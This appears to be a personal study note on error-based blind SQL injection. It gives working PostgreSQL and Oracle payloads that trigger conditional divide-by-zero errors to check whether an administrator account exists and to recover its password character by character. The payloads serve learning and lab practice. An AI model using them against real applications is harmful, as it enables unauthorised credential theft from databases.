---
tags:
  - security
  - web
---
Blind SQLI that wants to trigger messages to infer data from the database.
- Similar to [[Blind SQLI Conditional Triggering|Boolean Based SQLI]]
# PostgreSQL
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
- If the first character of password is greater than 'm', then server should return an error
```
xyz' AND 1/0--
```
- Always returns 1/0 error
# Oracle
```
' AND (SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator')='administrator') THEN TO_CHAR(1/0) ELSE 'b' END FROM dual)='b'--
```
- if there is an administrator user, crashes the page
```
' AND (SELECT CASE WHEN ((SELECT 'a' FROM users WHERE username='administrator' AND SUBSTR(password,1,1) = 'd')='a') THEN TO_CHAR(1/0) ELSE 'b' END FROM dual)='b'--
```
- Errors if first char of substring is equal to 'd'